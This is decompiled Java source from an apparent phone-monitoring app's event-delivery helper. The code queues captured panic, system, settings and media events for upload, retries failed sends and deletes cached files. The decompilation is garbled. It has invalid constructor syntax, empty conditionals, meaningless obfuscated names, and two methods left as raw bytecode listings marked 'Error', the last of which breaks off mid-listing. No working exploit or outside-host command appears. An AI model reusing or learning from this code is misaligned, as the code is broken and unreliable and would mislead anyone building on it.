package com.vvt.eventdelivery;

import com.vvt.base.FxEventType;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.h;
import com.vvt.datadeliverymanager.i;
import com.vvt.eventrepository.eventresult.EventKeys;
import com.vvt.phoenix.prot.command.aa;
import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map.Entry;
import java.util.Set;

class c
  implements com.vvt.datadeliverymanager.a.a
{
  private static final boolean a;
  private static final boolean b;
  private static final boolean c;
  private static final boolean d;
  private int e;
  private com.vvt.datadeliverymanager.b f;
  private com.vvt.eventrepository.b g;
  private HashMap h;
  private HashMap i;
  private String j;
  private HashMap k = null;
  private HashMap l = null;
  private HashMap m;
  
  static
  {
    boolean bool = com.vvt.datadeliverymanager.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = com.vvt.datadeliverymanager.a.b;
      c = com.vvt.datadeliverymanager.a.e;
      d = com.vvt.datadeliverymanager.a.d;
      return;
    }
  }
  
  c(String paramString, int paramInt, com.vvt.datadeliverymanager.b paramb, com.vvt.eventrepository.b paramb1)
  {
    Object localObject = new com/vvt/eventdelivery/EventDeliveryHelper$1;
    ((EventDeliveryHelper.1)localObject).<init>(this);
    this.m = ((HashMap)localObject);
    this.j = paramString;
    this.e = paramInt;
    this.f = paramb;
    this.g = paramb1;
    localObject = new java/util/HashMap;
    ((HashMap)localObject).<init>();
    this.h = ((HashMap)localObject);
    localObject = new java/util/HashMap;
    ((HashMap)localObject).<init>();
    this.i = ((HashMap)localObject);
    localObject = new java/util/HashMap;
    ((HashMap)localObject).<init>();
    this.k = ((HashMap)localObject);
    localObject = new java/util/HashMap;
    ((HashMap)localObject).<init>();
    this.l = ((HashMap)localObject);
    this.f.a(paramInt, this);
  }
  
  private h a(EventDelivery.Type paramType, com.vvt.phoenix.prot.command.b paramb)
  {
    boolean bool = true;
    h localh = new com/vvt/datadeliverymanager/h;
    localh.<init>();
    int n = this.e;
    localh.a(n);
    localh.a(paramb);
    Object localObject = d(paramType);
    localh.a((PriorityRequest)localObject);
    localObject = e(paramType);
    localh.a((DataProviderType)localObject);
    n = f(paramType);
    localh.c(n);
    localObject = DeliveryRequestType.REQUEST_TYPE_NEW;
    localh.a((DeliveryRequestType)localObject);
    n = g(paramType);
    long l1 = n;
    localh.b(l1);
    localObject = EventDelivery.Type.TYPE_ACTUAL_MEDIA;
    if (paramType != localObject)
    {
      localObject = EventDelivery.Type.TYPE_NONE_REGULAR_ACTUAL_MEDIA;
      if (paramType != localObject) {}
    }
    else
    {
      localh.c(false);
      localh.b(false);
    }
    for (;;)
    {
      return localh;
      localh.c(bool);
      localh.b(bool);
    }
  }
  
  private EventDelivery.Type a(DataProviderType paramDataProviderType)
  {
    EventDelivery.Type localType = null;
    DataProviderType localDataProviderType = DataProviderType.DATA_PROVIDER_TYPE_PANIC;
    if (paramDataProviderType == localDataProviderType) {
      localType = EventDelivery.Type.TYPE_PANIC;
    }
    for (;;)
    {
      return localType;
      localDataProviderType = DataProviderType.DATA_PROVIDER_TYPE_SYSTEM;
      if (paramDataProviderType == localDataProviderType)
      {
        localType = EventDelivery.Type.TYPE_SYSTEM;
      }
      else
      {
        localDataProviderType = DataProviderType.DATA_PROVIDER_TYPE_SETTINGS;
        if (paramDataProviderType == localDataProviderType)
        {
          localType = EventDelivery.Type.TYPE_SETTINGS;
        }
        else
        {
          localDataProviderType = DataProviderType.DATA_PROVIDER_TYPE_ALL_REGULAR;
          if (paramDataProviderType == localDataProviderType)
          {
            localType = EventDelivery.Type.TYPE_REGULAR;
          }
          else
          {
            localDataProviderType = DataProviderType.DATA_PROVIDER_TYPE_ACTUAL_MEDIA;
            if (paramDataProviderType == localDataProviderType)
            {
              localType = EventDelivery.Type.TYPE_ACTUAL_MEDIA;
            }
            else
            {
              localDataProviderType = DataProviderType.DATA_PROVIDER_TYPE_NONE_REGULAR_ACTUAL_MEDIA;
              if (paramDataProviderType == localDataProviderType) {
                localType = EventDelivery.Type.TYPE_NONE_REGULAR_ACTUAL_MEDIA;
              }
            }
          }
        }
      }
    }
  }
  
  /* Error */
  private static Object a(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: new 165	java/io/ObjectInputStream
    //   5: astore_2
    //   6: new 167	java/io/FileInputStream
    //   9: astore_3
    //   10: new 169	java/io/File
    //   13: astore 4
    //   15: aload 4
    //   17: aload_0
    //   18: invokespecial 172	java/io/File:<init>	(Ljava/lang/String;)V
    //   21: aload_3
    //   22: aload 4
    //   24: invokespecial 175	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   27: aload_2
    //   28: aload_3
    //   29: invokespecial 178	java/io/ObjectInputStream:<init>	(Ljava/io/InputStream;)V
    //   32: aload_2
    //   33: invokevirtual 182	java/io/ObjectInputStream:readObject	()Ljava/lang/Object;
    //   36: astore_1
    //   37: aload_2
    //   38: invokestatic 187	com/vvt/io/d:a	(Ljava/io/ObjectInputStream;)V
    //   41: aload_1
    //   42: areturn
    //   43: astore_2
    //   44: aconst_null
    //   45: astore_2
    //   46: getstatic 38	com/vvt/eventdelivery/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   49: istore 5
    //   51: iload 5
    //   53: ifeq -16 -> 37
    //   56: goto -19 -> 37
    //   59: astore_2
    //   60: aconst_null
    //   61: astore_2
    //   62: getstatic 38	com/vvt/eventdelivery/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   65: istore 5
    //   67: iload 5
    //   69: ifeq -32 -> 37
    //   72: goto -35 -> 37
    //   75: astore 6
    //   77: aconst_null
    //   78: astore_2
    //   79: aload 6
    //   81: astore_1
    //   82: aload_2
    //   83: invokestatic 187	com/vvt/io/d:a	(Ljava/io/ObjectInputStream;)V
    //   86: aload_1
    //   87: athrow
    //   88: astore_1
    //   89: goto -7 -> 82
    //   92: astore_3
    //   93: goto -31 -> 62
    //   96: astore_3
    //   97: goto -51 -> 46
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	100	0	paramString	String
    //   1	86	1	localObject1	Object
    //   88	1	1	localObject2	Object
    //   5	33	2	localObjectInputStream1	java.io.ObjectInputStream
    //   43	1	2	localIOException1	java.io.IOException
    //   45	1	2	localObject3	Object
    //   59	1	2	localClassNotFoundException1	ClassNotFoundException
    //   61	22	2	localObjectInputStream2	java.io.ObjectInputStream
    //   9	20	3	localFileInputStream	java.io.FileInputStream
    //   92	1	3	localClassNotFoundException2	ClassNotFoundException
    //   96	1	3	localIOException2	java.io.IOException
    //   13	10	4	localFile	File
    //   49	19	5	bool	boolean
    //   75	5	6	localObject4	Object
    // Exception table:
    //   from	to	target	type
    //   2	5	43	java/io/IOException
    //   6	9	43	java/io/IOException
    //   10	13	43	java/io/IOException
    //   17	21	43	java/io/IOException
    //   22	27	43	java/io/IOException
    //   28	32	43	java/io/IOException
    //   2	5	59	java/lang/ClassNotFoundException
    //   6	9	59	java/lang/ClassNotFoundException
    //   10	13	59	java/lang/ClassNotFoundException
    //   17	21	59	java/lang/ClassNotFoundException
    //   22	27	59	java/lang/ClassNotFoundException
    //   28	32	59	java/lang/ClassNotFoundException
    //   2	5	75	finally
    //   6	9	75	finally
    //   10	13	75	finally
    //   17	21	75	finally
    //   22	27	75	finally
    //   28	32	75	finally
    //   32	36	88	finally
    //   46	49	88	finally
    //   62	65	88	finally
    //   32	36	92	java/lang/ClassNotFoundException
    //   32	36	96	java/io/IOException
  }
  
  private void a(int paramInt)
  {
    boolean bool = a;
    if (bool) {}
    HashMap localHashMap = this.i;
    if (localHashMap == null)
    {
      bool = b;
      if (!bool) {}
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      localHashMap = this.i;
      Integer localInteger = Integer.valueOf(paramInt);
      bool = localHashMap.containsKey(localInteger);
      if (bool)
      {
        localHashMap = this.i;
        localInteger = Integer.valueOf(paramInt);
        localHashMap.remove(localInteger);
        bool = a;
        if (!bool) {}
      }
      else
      {
        bool = b;
        if (!bool) {}
      }
    }
  }
  
  private void a(int paramInt, com.vvt.datadeliverymanager.a.a parama)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    Object localObject1 = null;
    Object localObject2 = this.i;
    Integer localInteger = Integer.valueOf(paramInt);
    boolean bool2 = ((HashMap)localObject2).containsKey(localInteger);
    if (bool2)
    {
      localObject1 = this.i;
      localObject2 = Integer.valueOf(paramInt);
      localObject1 = (ArrayList)((HashMap)localObject1).get(localObject2);
    }
    if (localObject1 == null)
    {
      localObject1 = new java/util/ArrayList;
      ((ArrayList)localObject1).<init>();
    }
    if (parama != null)
    {
      ((ArrayList)localObject1).add(parama);
      bool2 = a;
      if (!bool2) {}
    }
    localObject2 = this.i;
    localInteger = Integer.valueOf(paramInt);
    ((HashMap)localObject2).put(localInteger, localObject1);
    bool1 = a;
    if (bool1) {}
  }
  
  private void a(i parami, EventDelivery.Type paramType)
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    Object localObject = this.m;
    Integer localInteger = Integer.valueOf(0);
    ((HashMap)localObject).put(paramType, localInteger);
    localObject = EventDelivery.Type.TYPE_ACTUAL_MEDIA;
    if (paramType == localObject) {
      d(parami);
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      bool = a;
      if (bool) {}
      a(paramType);
      bool = a;
      if (bool) {}
      a(parami, true);
      bool = a;
      if (bool) {}
      c(paramType);
    }
  }
  
  private void a(i parami, boolean paramBoolean)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = parami.b();
    Object localObject2 = a((DataProviderType)localObject1);
    bool1 = false;
    localObject1 = null;
    boolean bool2;
    if (localObject2 != null)
    {
      HashMap localHashMap = this.h;
      if (localHashMap != null)
      {
        localHashMap = this.h;
        bool2 = localHashMap.containsKey(localObject2);
        if (bool2) {
          localObject1 = (ArrayList)this.h.get(localObject2);
        }
      }
    }
    if (localObject1 != null)
    {
      int n = ((ArrayList)localObject1).size();
      if (n > 0)
      {
        localObject2 = ((ArrayList)localObject1).iterator();
        for (;;)
        {
          bool1 = ((Iterator)localObject2).hasNext();
          if (!bool1) {
            break;
          }
          localObject1 = (com.vvt.datadeliverymanager.a.a)((Iterator)localObject2).next();
          if (paramBoolean)
          {
            bool2 = b;
            if (bool2) {}
            ((com.vvt.datadeliverymanager.a.a)localObject1).b(parami);
          }
          else
          {
            bool2 = b;
            if (bool2) {}
            ((com.vvt.datadeliverymanager.a.a)localObject1).a(parami);
          }
        }
      }
    }
    bool1 = b;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
  }
  
  private void a(i parami, boolean paramBoolean, int paramInt)
  {
    boolean bool1 = false;
    Object localObject1 = null;
    Object localObject2 = this.i;
    if (localObject2 != null)
    {
      localObject2 = this.i;
      Integer localInteger = Integer.valueOf(paramInt);
      boolean bool2 = ((HashMap)localObject2).containsKey(localInteger);
      if (bool2)
      {
        localObject1 = this.i;
        localObject2 = Integer.valueOf(paramInt);
        localObject1 = (ArrayList)((HashMap)localObject1).get(localObject2);
      }
    }
    if (localObject1 != null)
    {
      int n = ((ArrayList)localObject1).size();
      if (n > 0)
      {
        localObject2 = ((ArrayList)localObject1).iterator();
        for (;;)
        {
          bool1 = ((Iterator)localObject2).hasNext();
          if (!bool1) {
            break;
          }
          localObject1 = (com.vvt.datadeliverymanager.a.a)((Iterator)localObject2).next();
          boolean bool3;
          if (paramBoolean)
          {
            bool3 = b;
            if (bool3) {}
            ((com.vvt.datadeliverymanager.a.a)localObject1).b(parami);
          }
          else
          {
            bool3 = b;
            if (bool3) {}
            ((com.vvt.datadeliverymanager.a.a)localObject1).a(parami);
          }
        }
      }
    }
    bool1 = d;
    if (bool1) {}
  }
  
  private void a(EventDelivery.Type paramType)
  {
    String str = b.a(this.j, paramType);
    File localFile = new java/io/File;
    localFile.<init>(str);
    localFile.delete();
  }
  
  private void a(EventDelivery.Type paramType, com.vvt.datadeliverymanager.a.a parama)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    ArrayList localArrayList = null;
    HashMap localHashMap = this.h;
    boolean bool2 = localHashMap.containsKey(paramType);
    if (bool2) {
      localArrayList = (ArrayList)this.h.get(paramType);
    }
    if (localArrayList == null)
    {
      localArrayList = new java/util/ArrayList;
      localArrayList.<init>();
    }
    if (parama != null) {
      localArrayList.add(parama);
    }
    bool2 = a;
    if (bool2) {}
    localHashMap = this.h;
    localHashMap.put(paramType, localArrayList);
    bool1 = a;
    if (bool1) {}
  }
  
  private void a(EventDelivery.Type paramType, i parami)
  {
    boolean bool1 = true;
    boolean bool2 = false;
    int n = -1;
    boolean bool3 = f(parami);
    boolean bool4 = a;
    if (bool4) {}
    a(paramType);
    a locala;
    boolean bool5;
    if (bool3)
    {
      bool4 = a;
      if (bool4) {}
      locala = (a)b(paramType, n).b();
      int i1 = locala.c();
      boolean bool6 = b;
      if ((!bool6) || (i1 > 0))
      {
        bool5 = b;
        if (bool5) {}
        bool5 = a;
        if (bool5) {}
        a(parami, false);
        b(paramType, n, this);
        bool5 = bool1;
      }
    }
    for (;;)
    {
      bool2 = a;
      if ((!bool2) || ((!bool3) || (!bool5)))
      {
        bool5 = a;
        if (bool5) {}
        a(parami, bool1);
        c(paramType);
      }
      return;
      bool5 = b;
      if (bool5) {}
      bool5 = false;
      locala = null;
    }
  }
  
  private aa b(EventDelivery.Type paramType, int paramInt)
  {
    a locala = new com/vvt/eventdelivery/a;
    Object localObject = this.g;
    String str = this.j;
    locala.<init>((com.vvt.eventrepository.b)localObject, paramType, str, paramInt);
    localObject = new com/vvt/phoenix/prot/command/aa;
    ((aa)localObject).<init>();
    ((aa)localObject).a(locala);
    return (aa)localObject;
  }
  
  private void b(int paramInt, com.vvt.datadeliverymanager.a.a parama)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = this.i;
    if (localObject == null)
    {
      bool1 = b;
      if (!bool1) {}
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      localObject = this.i;
      Integer localInteger = Integer.valueOf(paramInt);
      bool1 = ((HashMap)localObject).containsKey(localInteger);
      if (bool1)
      {
        new ArrayList();
        localObject = this.i;
        localInteger = Integer.valueOf(paramInt);
        localObject = (ArrayList)((HashMap)localObject).get(localInteger);
        boolean bool2 = ((ArrayList)localObject).contains(parama);
        if (bool2)
        {
          ((ArrayList)localObject).remove(parama);
          bool1 = a;
          if (!bool1) {}
        }
      }
      else
      {
        bool1 = b;
        if (!bool1) {}
      }
    }
  }
  
  private void b(i parami, EventDelivery.Type paramType)
  {
    int n = 0;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = (HashMap)this.k.get(paramType);
    Object localObject2;
    if (localObject1 != null)
    {
      localObject2 = (Integer)this.m.get(paramType);
      int i1 = ((Integer)localObject2).intValue() + 1;
      boolean bool3 = a;
      if (bool3) {}
      Object localObject3 = this.m;
      Object localObject4 = Integer.valueOf(i1);
      ((HashMap)localObject3).put(paramType, localObject4);
      bool3 = a;
      if (bool3) {}
      int i2 = 5;
      if (i1 < i2)
      {
        boolean bool2 = a;
        if (bool2) {}
        localObject1 = ((HashMap)localObject1).entrySet().iterator();
        localObject4 = null;
        bool2 = ((Iterator)localObject1).hasNext();
        if (bool2)
        {
          localObject1 = (Map.Entry)((Iterator)localObject1).next();
          localObject2 = (Integer)((Map.Entry)localObject1).getKey();
          n = ((Integer)localObject2).intValue();
          localObject1 = (com.vvt.datadeliverymanager.a.a)((Map.Entry)localObject1).getValue();
          localObject4 = localObject1;
        }
        localObject1 = this.l;
        bool1 = ((HashMap)localObject1).containsKey(paramType);
        if (bool1)
        {
          bool1 = a;
          if (bool1) {}
          localObject1 = (d)this.l.get(paramType);
          ((d)localObject1).a();
        }
        bool1 = a;
        if (bool1) {}
        localObject1 = new com/vvt/eventdelivery/d;
        int i3 = 180;
        localObject2 = this;
        localObject3 = paramType;
        ((d)localObject1).<init>(this, paramType, n, (com.vvt.datadeliverymanager.a.a)localObject4, i3);
        localObject2 = this.l;
        ((HashMap)localObject2).put(paramType, localObject1);
        bool1 = a;
        if (bool1)
        {
          bool1 = a;
          if (bool1) {}
          localObject1 = this.l.entrySet();
          localObject2 = ((Set)localObject1).iterator();
          for (;;)
          {
            bool1 = ((Iterator)localObject2).hasNext();
            if (!bool1) {
              break;
            }
            localObject1 = (Map.Entry)((Iterator)localObject2).next();
            bool1 = a;
            if (bool1) {}
            bool1 = a;
            if (!bool1) {}
          }
          bool1 = a;
          if (!bool1) {}
        }
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      bool1 = a;
      if (bool1) {}
      a(parami, paramType);
      continue;
      bool1 = a;
      if (bool1) {}
      bool1 = a;
      if (bool1) {}
      localObject1 = this.m;
      localObject2 = Integer.valueOf(0);
      ((HashMap)localObject1).put(paramType, localObject2);
      bool1 = a;
      if (bool1) {}
      localObject1 = this.k;
      ((HashMap)localObject1).remove(paramType);
    }
  }
  
  private void b(EventDelivery.Type paramType)
  {
    String str = b.a(this.j, paramType);
    File localFile = new java/io/File;
    localFile.<init>(str);
    localFile.delete();
  }
  
  private void b(EventDelivery.Type paramType, int paramInt, com.vvt.datadeliverymanager.a.a parama)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = b(paramType, paramInt);
    Object localObject2 = (a)((aa)localObject1).b();
    int n = ((a)localObject2).c();
    boolean bool3 = b;
    boolean bool2;
    if ((!bool3) || (n > 0))
    {
      localObject2 = a(paramType, (com.vvt.phoenix.prot.command.b)localObject1);
      ((h)localObject2).a(this);
      localObject1 = this.f;
      ((com.vvt.datadeliverymanager.b)localObject1).a((h)localObject2);
      bool2 = b;
      if (bool2) {}
      localObject2 = this.k;
      bool2 = ((HashMap)localObject2).containsKey(paramType);
      if (!bool2)
      {
        bool2 = a;
        if (bool2) {}
        localObject2 = new java/util/HashMap;
        ((HashMap)localObject2).<init>();
        localObject1 = Integer.valueOf(paramInt);
        ((HashMap)localObject2).put(localObject1, parama);
        localObject1 = this.k;
        ((HashMap)localObject1).put(paramType, localObject2);
      }
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return;
      bool2 = a;
      if (bool2)
      {
        continue;
        bool2 = b;
        if (bool2) {}
        localObject2 = new com/vvt/datadeliverymanager/i;
        ((i)localObject2).<init>();
        localObject1 = e(paramType);
        ((i)localObject2).a((DataProviderType)localObject1);
        boolean bool4 = true;
        ((i)localObject2).b(bool4);
        if (parama != null) {
          parama.b((i)localObject2);
        }
        localObject2 = EventDelivery.Type.TYPE_ACTUAL_MEDIA;
        if (paramType == localObject2)
        {
          bool2 = a;
          if (bool2) {}
          b(paramInt, parama);
        }
        else
        {
          bool2 = a;
          if (bool2) {}
          b(paramType, parama);
        }
      }
    }
  }
  
  private void b(EventDelivery.Type paramType, com.vvt.datadeliverymanager.a.a parama)
  {
    Object localObject = this.h;
    boolean bool1;
    if (localObject != null)
    {
      localObject = this.h;
      bool1 = ((HashMap)localObject).containsKey(paramType);
      if (bool1)
      {
        new ArrayList();
        localObject = (ArrayList)this.h.get(paramType);
        boolean bool2 = ((ArrayList)localObject).contains(parama);
        if (bool2)
        {
          ((ArrayList)localObject).remove(parama);
          bool1 = a;
          if (!bool1) {}
        }
      }
    }
    for (;;)
    {
      return;
      bool1 = b;
      if (!bool1) {}
    }
  }
  
  private void c(i parami)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = parami.b();
    localObject1 = a((DataProviderType)localObject1);
    boolean bool2;
    Object localObject2;
    if (localObject1 != null)
    {
      bool2 = parami.f();
      boolean bool4 = b;
      if ((!bool4) || (bool2))
      {
        bool2 = a;
        if (bool2) {}
        localObject2 = this.k;
        ((HashMap)localObject2).remove(localObject1);
        bool2 = a;
        if (bool2) {}
        localObject2 = this.m;
        bool4 = false;
        Integer localInteger = Integer.valueOf(0);
        ((HashMap)localObject2).put(localObject1, localInteger);
        localObject2 = EventDelivery.Type.TYPE_ACTUAL_MEDIA;
        if (localObject1 == localObject2) {
          d(parami);
        }
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      a((EventDelivery.Type)localObject1, parami);
      continue;
      bool2 = c;
      if (bool2) {}
      int n = parami.d();
      int i1 = 306;
      if (n != i1)
      {
        n = parami.d();
        i1 = 312;
        if (n != i1) {}
      }
      else
      {
        bool3 = a;
        if (bool3) {}
        b(parami, (EventDelivery.Type)localObject1);
        continue;
      }
      boolean bool3 = a;
      if (bool3) {}
      localObject2 = this.k;
      ((HashMap)localObject2).remove(localObject1);
      a(parami, (EventDelivery.Type)localObject1);
      continue;
      bool1 = c;
      if (!bool1) {}
    }
  }
  
  private void c(EventDelivery.Type paramType)
  {
    HashMap localHashMap = this.h;
    boolean bool;
    if (localHashMap != null)
    {
      localHashMap = this.h;
      bool = localHashMap.containsKey(paramType);
      if (bool)
      {
        localHashMap = this.h;
        localHashMap.remove(paramType);
        bool = a;
        if (!bool) {}
      }
    }
    for (;;)
    {
      return;
      bool = b;
      if (!bool) {}
    }
  }
  
  private PriorityRequest d(EventDelivery.Type paramType)
  {
    PriorityRequest localPriorityRequest = PriorityRequest.PRIORITY_LOW;
    EventDelivery.Type localType = EventDelivery.Type.TYPE_PANIC;
    if (paramType == localType) {
      localPriorityRequest = PriorityRequest.PRIORITY_HIGH;
    }
    for (;;)
    {
      return localPriorityRequest;
      localType = EventDelivery.Type.TYPE_REGULAR;
      if (paramType != localType)
      {
        localType = EventDelivery.Type.TYPE_SYSTEM;
        if (paramType != localType)
        {
          localType = EventDelivery.Type.TYPE_SETTINGS;
          if (paramType != localType) {
            break label53;
          }
        }
      }
      localPriorityRequest = PriorityRequest.PRIORITY_NORMAL;
      continue;
      label53:
      localType = EventDelivery.Type.TYPE_ACTUAL_MEDIA;
      if (paramType != localType)
      {
        localType = EventDelivery.Type.TYPE_NONE_REGULAR_ACTUAL_MEDIA;
        if (paramType != localType) {}
      }
      else
      {
        localPriorityRequest = PriorityRequest.PRIORITY_LOW;
      }
    }
  }
  
  private void d(i parami)
  {
    boolean bool1 = a;
    if (bool1) {}
    int n = e(parami);
    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    EventDelivery.Type localType = EventDelivery.Type.TYPE_ACTUAL_MEDIA;
    b(localType);
    a(parami, true, n);
    a(n);
  }
  
  private int e(i parami)
  {
    boolean bool1 = a;
    if (bool1) {}
    int i3 = -1;
    EventKeys localEventKeys = g(parami);
    Object localObject1 = localEventKeys.getKeys();
    int n = ((Set)localObject1).size();
    if (n > 0)
    {
      boolean bool2 = a;
      if (bool2) {}
      if (localEventKeys == null) {
        break label216;
      }
      localObject1 = localEventKeys.getKeys();
      if (localObject1 == null) {
        break label216;
      }
      localObject1 = localEventKeys.getKeys();
      int i1 = ((Set)localObject1).size();
      if (i1 <= 0) {
        break label216;
      }
      boolean bool3 = a;
      if (bool3) {}
      Object localObject2 = localEventKeys.getKeys();
      bool3 = false;
      localObject1 = null;
      localObject2 = ((Set)localObject2).iterator();
      boolean bool6 = ((Iterator)localObject2).hasNext();
      if (bool6)
      {
        localObject1 = (FxEventType)((Iterator)localObject2).next();
        localObject1 = localEventKeys.getEventIDs((FxEventType)localObject1);
      }
      if (localObject1 == null) {
        break label208;
      }
      int i4 = ((List)localObject1).size();
      if (i4 <= 0) {
        break label208;
      }
      i3 = 0;
      localObject1 = ((Long)((List)localObject1).get(0)).toString();
    }
    boolean bool5;
    boolean bool4;
    label208:
    label216:
    for (int i2 = Integer.parseInt((String)localObject1);; bool4 = bool5)
    {
      bool5 = a;
      if (bool5) {}
      return i2;
      bool4 = d;
      if (!bool4) {
        break;
      }
      break;
      bool4 = c;
      if (!bool4) {}
    }
  }
  
  private DataProviderType e(EventDelivery.Type paramType)
  {
    DataProviderType localDataProviderType = DataProviderType.DATA_PROVIDER_TYPE_NONE;
    EventDelivery.Type localType = EventDelivery.Type.TYPE_PANIC;
    if (paramType == localType) {
      localDataProviderType = DataProviderType.DATA_PROVIDER_TYPE_PANIC;
    }
    for (;;)
    {
      return localDataProviderType;
      localType = EventDelivery.Type.TYPE_SYSTEM;
      if (paramType == localType)
      {
        localDataProviderType = DataProviderType.DATA_PROVIDER_TYPE_SYSTEM;
      }
      else
      {
        localType = EventDelivery.Type.TYPE_SETTINGS;
        if (paramType == localType)
        {
          localDataProviderType = DataProviderType.DATA_PROVIDER_TYPE_SETTINGS;
        }
        else
        {
          localType = EventDelivery.Type.TYPE_REGULAR;
          if (paramType == localType)
          {
            localDataProviderType = DataProviderType.DATA_PROVIDER_TYPE_ALL_REGULAR;
          }
          else
          {
            localType = EventDelivery.Type.TYPE_ACTUAL_MEDIA;
            if (paramType == localType)
            {
              localDataProviderType = DataProviderType.DATA_PROVIDER_TYPE_ACTUAL_MEDIA;
            }
            else
            {
              localType = EventDelivery.Type.TYPE_NONE_REGULAR_ACTUAL_MEDIA;
              if (paramType == localType) {
                localDataProviderType = DataProviderType.DATA_PROVIDER_TYPE_NONE_REGULAR_ACTUAL_MEDIA;
              }
            }
          }
        }
      }
    }
  }
  
  private int f(EventDelivery.Type paramType)
  {
    EventDelivery.Type localType = EventDelivery.Type.TYPE_PANIC;
    if (paramType == localType) {}
    for (int n = 100;; n = 10) {
      return n;
    }
  }
  
  /* Error */
  private boolean f(i parami)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_2
    //   2: getstatic 31	com/vvt/eventdelivery/MyUncaughtExceptionHandler:a	Z
    //   5: istore_3
    //   6: iload_3
    //   7: ifeq +3 -> 10
    //   10: aload_0
    //   11: aload_1
    //   12: invokespecial 378	com/vvt/eventdelivery/MyUncaughtExceptionHandler:FxFileObserverWorker	(Lcom/vvt/datadeliverymanager/i;)Lcom/vvt/eventrepository/eventresult/EventKeys;
    //   15: astore 4
    //   17: aload 4
    //   19: ifnull +316 -> 335
    //   22: aload 4
    //   24: invokevirtual 383	com/vvt/eventrepository/eventresult/EventKeys:getKeys	()Ljava/util/Set;
    //   27: astore 5
    //   29: aload 5
    //   31: ifnull +304 -> 335
    //   34: aload 4
    //   36: invokevirtual 383	com/vvt/eventrepository/eventresult/EventKeys:getKeys	()Ljava/util/Set;
    //   39: astore 5
    //   41: aload 5
    //   43: invokeinterface 384 1 0
    //   48: istore_3
    //   49: iload_3
    //   50: ifle +285 -> 335
    //   53: aload 4
    //   55: invokevirtual 383	com/vvt/eventrepository/eventresult/EventKeys:getKeys	()Ljava/util/Set;
    //   58: astore 5
    //   60: aload 5
    //   62: invokeinterface 307 1 0
    //   67: astore 6
    //   69: aload 6
    //   71: invokeinterface 251 1 0
    //   76: istore_3
    //   77: iload_3
    //   78: ifeq +237 -> 315
    //   81: aload 6
    //   83: invokeinterface 254 1 0
    //   88: astore 5
    //   90: aload 5
    //   92: checkcast 386	com/vvt/base/FxEventType
    //   95: astore 5
    //   97: getstatic 31	com/vvt/eventdelivery/MyUncaughtExceptionHandler:a	Z
    //   100: istore 7
    //   102: iload 7
    //   104: ifeq +3 -> 107
    //   107: aload 5
    //   109: invokestatic 415	com/vvt/base/FxEventType:isThumbnail	(Lcom/vvt/base/FxEventType;)Z
    //   112: istore 7
    //   114: iload 7
    //   116: ifeq +108 -> 224
    //   119: aload 4
    //   121: aload 5
    //   123: invokevirtual 390	com/vvt/eventrepository/eventresult/EventKeys:getEventIDs	(Lcom/vvt/base/FxEventType;)Ljava/util/List;
    //   126: astore 8
    //   128: aload 8
    //   130: invokeinterface 416 1 0
    //   135: astore 9
    //   137: aload 9
    //   139: invokeinterface 251 1 0
    //   144: istore 7
    //   146: iload 7
    //   148: ifeq +76 -> 224
    //   151: aload 9
    //   153: invokeinterface 254 1 0
    //   158: astore 8
    //   160: aload 8
    //   162: checkcast 398	java/lang/Long
    //   165: astore 8
    //   167: aload 8
    //   169: invokevirtual 420	java/lang/Long:longValue	()J
    //   172: lstore 10
    //   174: aload_0
    //   175: getfield 64	com/vvt/eventdelivery/MyUncaughtExceptionHandler:FxFileObserverWorker	Lcom/vvt/eventrepository/removeFromPath;
    //   178: astore 8
    //   180: iconst_1
    //   181: istore 12
    //   183: aload 8
    //   185: lload 10
    //   187: iload 12
    //   189: invokeinterface 425 4 0
    //   194: goto -57 -> 137
    //   197: astore 5
    //   199: getstatic 38	com/vvt/eventdelivery/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   202: istore_3
    //   203: iload_3
    //   204: ifeq +3 -> 207
    //   207: iconst_0
    //   208: istore_3
    //   209: aconst_null
    //   210: astore 5
    //   212: getstatic 31	com/vvt/eventdelivery/MyUncaughtExceptionHandler:a	Z
    //   215: istore 7
    //   217: iload 7
    //   219: ifeq +3 -> 222
    //   222: iload_3
    //   223: ireturn
    //   224: aload 5
    //   226: invokestatic 428	com/vvt/base/FxEventType:isNoneRegularActualMedia	(Lcom/vvt/base/FxEventType;)Z
    //   229: istore 7
    //   231: iload 7
    //   233: ifeq -164 -> 69
    //   236: aload 4
    //   238: aload 5
    //   240: invokevirtual 390	com/vvt/eventrepository/eventresult/EventKeys:getEventIDs	(Lcom/vvt/base/FxEventType;)Ljava/util/List;
    //   243: astore 5
    //   245: aload 5
    //   247: invokeinterface 416 1 0
    //   252: astore 8
    //   254: aload 8
    //   256: invokeinterface 251 1 0
    //   261: istore_3
    //   262: iload_3
    //   263: ifeq -194 -> 69
    //   266: aload 8
    //   268: invokeinterface 254 1 0
    //   273: astore 5
    //   275: aload 5
    //   277: checkcast 398	java/lang/Long
    //   280: astore 5
    //   282: aload 5
